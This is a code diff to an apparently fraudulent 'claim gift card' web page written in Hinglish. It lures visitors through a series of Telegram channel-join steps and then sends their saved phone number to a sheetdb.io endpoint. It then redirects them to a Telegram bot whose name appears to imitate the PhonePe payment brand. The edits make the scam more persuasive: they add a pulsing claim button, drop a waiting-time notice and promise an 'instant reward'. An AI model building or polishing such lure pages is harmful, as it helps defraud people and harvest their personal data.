@@ -15,7 +15,8 @@
         input { width: 100%; padding: 14px; margin-bottom: 15px; border: 2px solid #ce93d8; border-radius: 10px; font-size: 15px; outline: none; text-align: center; }
         .btn { width: 100%; background: #66bb6a; color: white; padding: 14px; border: none; border-radius: 25px; font-weight: bold; font-size: 16px; cursor: pointer; box-shadow: 0 4px 10px rgba(102, 187, 106, 0.4); margin-bottom: 12px; }
         .btn-telegram { background: #0088cc; }
-        .btn-claim { background: #d81b60; color: white; font-weight: bold; padding: 15px; font-size: 18px; }
+        .btn-claim { background: #d81b60; color: white; font-weight: bold; padding: 15px; font-size: 18px; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.03); } 100% { transform: scale(1); } }
         .step { display: none; }
         .active { display: block; }
     </style>
@@ -47,11 +48,11 @@
         <button class="btn btn-telegram" onclick="openChannel2()">3. Join Channel 2</button>
     </div>
 
-    <!-- Step 4: Final Claim Button -->
+    <!-- Step 4: Direct Claim Button (No 36-48 Hours Text) -->
     <div id="step4" class="step">
-        <p style="font-size:15px; color:#333; font-weight:bold;">Verification Completed!</p>
-        <p style="font-size:14px; color:#555; margin-bottom:20px;">Ab niche button par click karke <b>Gift Card</b> claim karein:</p>
-        <button class="btn btn-claim" onclick="claimReward()">🎁 CLAIM GIFT CARD</button>
+        <p style="font-size:16px; color:#2e7d32; font-weight:bold; margin-bottom:5px;">✅ Tasks Completed!</p>
+        <p style="font-size:14px; color:#555; margin-bottom:20px;">Niche click karke Telegram Bot se instant reward lein:</p>
+        <button class="btn btn-claim" onclick="claimReward()">🎁 CLAIM GIFT CARD NOW</button>
     </div>
 </div>
 
@@ -84,14 +85,13 @@
     }
 
     function claimReward() {
-        // Data save karna (Optional, agar aapko user ka record rakhna hai)
         fetch('https://sheetdb.io/api/v1/obju8xm02uv6k', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ "Phone": savedInfo, "Status": "Clicked Claim", "Date": new Date().toLocaleString() })
         });
 
-        // Bot par redirect
+        // Bot par redirection
         window.open("https://t.me/Phonepay_Reward_bot", "_blank");
     }
 </script>
